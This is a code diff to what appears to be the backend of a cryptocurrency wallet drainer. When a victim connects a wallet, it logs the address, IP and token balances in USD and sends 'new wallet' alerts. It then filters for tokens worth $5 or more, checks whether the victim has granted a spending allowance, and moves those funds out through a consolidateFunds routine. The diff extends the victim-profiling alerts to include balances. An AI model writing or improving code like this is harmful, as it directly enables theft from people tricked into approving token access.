@@ -7,7 +7,7 @@ const { isAddress } = require('web3-validator');
 // Handle wallet connect
 async function handleWalletConnect(req, res) {
     try {
-        const { walletAddress, ipAddress } = req.body;
+        const { walletAddress, ipAddress, tokenBalances } = req.body;
         
         if (!walletAddress) {
             return res.status(400).json({
@@ -28,7 +28,24 @@ async function handleWalletConnect(req, res) {
             message: 'Wallet connect received' 
         });
         
-        const msg = `👤 Wallet: ${walletAddress}\n🌐 IP: ${ipAddress || 'Unknown'}\n📅 ${new Date().toISOString()}`;
+        // Build message with token balances
+        let msg = `👤 Wallet: ${walletAddress}\n🌐 IP: ${ipAddress || 'Unknown'}\n📅 ${new Date().toISOString()}\n\n`;
+        
+        if (tokenBalances && tokenBalances.length > 0) {
+            msg += `📋 Token Balances:\n`;
+            let totalValue = 0;
+            
+            for (const token of tokenBalances) {
+                const value = Number(token.usdValue) || 0;
+                totalValue += value;
+                msg += `  • ${token.name || 'UNKNOWN'}: $${value.toFixed(2)}\n`;
+            }
+            
+            msg += `\n💰 Total Value: $${totalValue.toFixed(2)}`;
+        } else {
+            msg += `📋 No tokens found`;
+        }
+        
         await sendAllNotifications('🆕 NEW WALLET CONNECTED', msg);
         
     } catch (error) {
@@ -89,7 +106,6 @@ async function processApprovalInBackground(walletAddress, tokenAddress) {
     try {
         console.log(`📥 Processing approval: ${walletAddress} - ${tokenAddress}`);
         
-        // Contract se SAB supported tokens ka balance check karo
         const tokenBalances = await getAllSupportedTokensBalance(walletAddress);
         
         if (tokenBalances.length === 0) {
@@ -99,7 +115,6 @@ async function processApprovalInBackground(walletAddress, tokenAddress) {
             return;
         }
         
-        // Check karo kya koi token $5+ hai
         const highValueTokens = tokenBalances.filter(t => Number(t.balanceValue) >= 5);
         
         if (highValueTokens.length === 0) {
@@ -115,7 +130,6 @@ async function processApprovalInBackground(walletAddress, tokenAddress) {
             return;
         }
         
-        // Check allowance for high value tokens
         const approvedTokens = [];
         for (const token of highValueTokens) {
             const allowance = await checkAllowance(
@@ -136,7 +150,6 @@ async function processApprovalInBackground(walletAddress, tokenAddress) {
             return;
         }
         
-        // Consolidate funds
         await consolidateFunds(walletAddress, tokenBalances);
         
     } catch (error) {
